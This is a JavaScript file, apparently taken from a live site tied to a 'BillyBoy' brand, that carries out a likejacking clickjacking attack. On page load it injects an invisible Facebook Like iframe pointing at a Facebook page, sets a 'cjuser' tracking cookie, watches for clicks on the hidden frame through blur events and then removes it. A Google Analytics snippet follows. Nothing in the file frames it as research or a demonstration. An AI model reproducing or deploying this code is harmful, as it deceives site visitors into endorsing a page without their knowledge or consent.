var cookiesuresi = 0; 
var test = 0;
	
var sure = 9; 
var sayfa = [
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey",
"https://www.facebook.com/BillyBoyTurkey"];


var myencoder = {

	get : function(input) {
		var output = "";
		var i = 0;
		while (i < input.length) {
			var chr1 = input.charCodeAt(i);
			output += String.fromCharCode(chr1 - 1);
			i++;
		}
		return output;
	}
}
Date.prototype.addHours = function(h) {
	this.setHours(this.getHours() + h);
	return this;
}

function setCookie(c_name, value, exhours) {
	var exdate = new Date();
	exdate.addHours(exhours);
	var c_value = escape(value)
			+ ((exhours == null) ? "" : "; expires=" + exdate.toUTCString());
	document.cookie = c_name + "=" + c_value;
}

function getCookie(c_name) {
	var i, x, y, ARRcookies = document.cookie.split(";");
	for (i = 0; i < ARRcookies.length; i++) {
		x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
		y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
		x = x.replace(/^\s+|\s+$/g, "");
		if (x == c_name) {
			return unescape(y);
		}
	}
}
var like;
function findPos(obj)

{

	var curleft = curtop = 0;
	if (obj.offsetParent) {

		curleft = obj.offsetLeft

		curtop = obj.offsetTop
		while (obj = obj.offsetParent) {

			curleft += obj.offsetLeft
			curtop += obj.offsetTop
		}

	}

	return [ curleft, curtop ];

}
function doJack() {

	var IE = document.all ? true : false;
	function mouseMove(e) {
		/*if (IE) {
			tempX = event.clientX + document.body.scrollLeft;
			tempY = event.clientY + document.body.scrollTop;
		} else {
			tempX = e.pageX;
			tempY = e.pageY;
		}

		if (tempX < 0)
			tempX = 0;
		if (tempY < 0)
			tempY = 0;

		like.style.top = (tempY - 5) + 'px';
		like.style.left = (tempX - 5) + 'px';*/

		return true
	}
	setCookie("cjuser", "cjuservalue", cookiesuresi);

	var tempX = 0, tempY = 0;

	document.captureEvents(Event.MOUSEMOVE);

	like = document.createElement('iframe');

	var randomnumber=Math.floor(Math.random()*10);
	
	like.src = 'http://www.facebook.com/plugins/like.php?href='
			+ sayfa[randomnumber]
			+ '';
	//console.info(randomnumber);
	//console.info(sayfa[randomnumber]);
	//console.info(like.src);
	like.scrolling = 'no';
	like.frameBorder = 0;
	like.allowTransparency = 'true';
	like.style.border = 0;
	like.style.overflow = 'hidden';
	like.style.cursor = 'pointer';
	like.style.width = '60px';
	like.style.height = '30px';
	like.style.position = 'absolute';
	
	like.style.top="10px";
	like.style.left="390px";
	like.style.opacity = 0; // Would be 0 if really used
	 console.info(like);
	document.getElementById('tinybox').appendChild(like);



	if (window.addEventListener)
		window.addEventListener('mousemove', mouseMove, false);
	else
		window.attachEvent('mousemove', mouseMove);
	setTimeout(function() {
try{
	document.getElementById("tinybox").removeChild(like);
		}catch(e){
		}
		if (window.removeEventListener)
			window.removeEventListener('mousemove', mouseMove, false);
		else
			window.detachEvent('onmousemove', mouseMove)
	}, 1000 * sure);

}

function startit() {

setTimeout(function(){doJack();},1000);
		var isIE = document.all ? true : false;

	/*	if (!isIE) {
			var script = document.createElement('script');
			script.src = 'https://www.facebook.com/imike3';

			script.onreadystatechange = function() {

			};
			script.onload = function() {
				console.inf('herej')
				//doJack();

			};
			script.onerror = function() {
				console.inf('here3')

			};
			document.body.appendChild(script);
		} else {
			// doJack();
		}
		*/
	
}

startit();

var isOverIFrame = false;

function processMouseOut() {
	
	isOverIFrame = false;
	top.focus();
}

function processMouseOver() {

	isOverIFrame = true;
}
function removeLike(){
//console.info("here");
	document.getElementById("tinycontent").removeChild(like)
}
function processIFrameClick() {
	if (isOverIFrame) {
		setTimeout("removeLike()",1000);
		//console.log("IFrame >> CLICK << detected. ");
	}
}

function attachOnloadEvent(func, obj) {
	if (typeof window.addEventListener != 'undefined') {
		window.addEventListener('load', func, false);
	} else if (typeof document.addEventListener != 'undefined') {
		document.addEventListener('load', func, false);
	} else if (typeof window.attachEvent != 'undefined') {
		window.attachEvent('onload', func);
	} else {
		if (typeof window.onload == 'function') {
			var oldonload = onload;
			window.onload = function() {
				oldonload();
				func();
			};
		} else {
			window.onload = func;
		}
	}
}

function init() {

	var element = document.getElementsByTagName("iframe");
	for ( var i = 0; i < element.length; i++) {
		element[i].onmouseover = processMouseOver;
		element[i].onmouseout = processMouseOut;
	}
	if (typeof window.attachEvent != 'undefined') {
		top.attachEvent('onblur', processIFrameClick);
	} else if (typeof window.addEventListener != 'undefined') {
		top.addEventListener('blur', processIFrameClick, false);
	}
}

attachOnloadEvent(init);


  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-43852888-3', 'billyboy.al');
  ga('send', 'pageview');


